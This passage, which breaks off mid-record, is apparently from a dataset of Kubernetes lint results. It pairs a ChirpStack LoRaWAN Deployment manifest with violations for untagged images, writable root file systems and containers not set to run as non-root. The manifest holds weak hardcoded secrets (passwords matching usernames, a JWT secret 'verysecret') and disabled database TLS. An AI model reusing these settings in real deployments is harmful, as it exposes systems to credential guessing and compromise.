  {
    "id": "10288",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"chirpstack-gateway-bridge\" is using an invalid container image, \"prrsjunior/chirpstack-gateway-bridge\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10289",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"chirpstack-geolocation-server\" is using an invalid container image, \"prrsjunior/chirpstack-geolocation-server\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10290",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"chirpstack-network-server\" is using an invalid container image, \"prrsjunior/chirpstack-network-server\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10291",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"chirpstack-application-server\" does not have a read-only root file system"
  },
  {
    "id": "10292",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"chirpstack-gateway-bridge\" does not have a read-only root file system"
  },
  {
    "id": "10293",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"chirpstack-geolocation-server\" does not have a read-only root file system"
  },
  {
    "id": "10294",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"chirpstack-network-server\" does not have a read-only root file system"
  },
  {
    "id": "10295",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"chirpstack-application-server\" is not set to runAsNonRoot"
  },
  {
    "id": "10296",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: chirpstack-application-server.toml\n          - key: chirpstack-network-server.toml\n            path: chirpstack-network-server.toml\n          - key: chirpstack-geolocation-server.toml\n            path: chirpstack-geolocation-server.toml\n          - key: chirpstack-gateway-bridge.toml\n            path: chirpstack-gateway-bridge.toml\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"chirpstack-gateway-bridge\" is not set to runAsNonRoot"
  },
  {
    "id": "10297",
    "manifest_path": "data/manifests/the_stack_sample/sample_3968.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: live-demo\n  labels:\n    app: chirpstack\nspec:\n  selector:\n    matchLabels:\n      app: chirpstack\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: chirpstack\n    spec:\n      containers:\n      - name: chirpstack-geolocation-server\n        image: prrsjunior/chirpstack-geolocation-server\n        env:\n        - name: GEO_SERVER__BACKEND__NAME\n          value: collos\n        ports:\n        - containerPort: 8005\n        volumeMounts:\n        - mountPath: /etc/chirpstack-geolocation-server\n          name: config-volume\n      - name: chirpstack-network-server\n        image: prrsjunior/chirpstack-network-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_ns:chirpstack_ns@postgresql/chirpstack_ns?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: NETWORK_SERVER__BAND__NAME\n          value: EU_863_870\n        - name: NETWORK_SERVER__GATEWAY__BACKEND__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: JOIN_SERVER__DEFAULT__SERVER\n          value: http://192.168.0.175:8009\n        - name: GEOLOCATION_SERVER__SERVER\n          value: chirpstack:8005\n        ports:\n        - containerPort: 8000\n        - containerPort: 9096\n        volumeMounts:\n        - mountPath: /etc/chirpstack-network-server\n          name: config-volume\n      - name: chirpstack-application-server\n        image: prrsjunior/chirpstack-application-server\n        env:\n        - name: POSTGRESQL__DSN\n          value: postgres://chirpstack_as:chirpstack_as@postgresql/chirpstack_as?sslmode=disable\n        - name: REDIS__URL\n          value: redis://redis:6379\n        - name: APPLICATION_SERVER__INTEGRATION__MQTT__SERVER\n          value: tcp://mosquitto:1883\n        - name: APPLICATION_SERVER__API__PUBLIC_HOST\n          value: localhost:8001\n        - name: APPLICATION_SERVER__EXTERNAL_API__JWT_SECRET\n          value: verysecret\n        ports:\n        - containerPort: 8080\n        - containerPort: 8001\n        - containerPort: 8003\n        - containerPort: 9095\n        volumeMounts:\n        - mountPath: /etc/chirpstack-application-server\n          name: config-volume\n      - name: chirpstack-gateway-bridge\n        image: prrsjunior/chirpstack-gateway-bridge\n        env:\n        - name: INTEGRATION__MQTT__AUTH__GENERIC__SERVERS\n          value: tcp://mosquitto:1883\n        ports:\n        - containerPort: 1700\n        - containerPort: 9097\n        volumeMounts:\n        - mountPath: /etc/chirpstack-gateway-bridge\n          name: config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: example\n          items:\n          - key: chirpstack-application-server.toml\n            path: 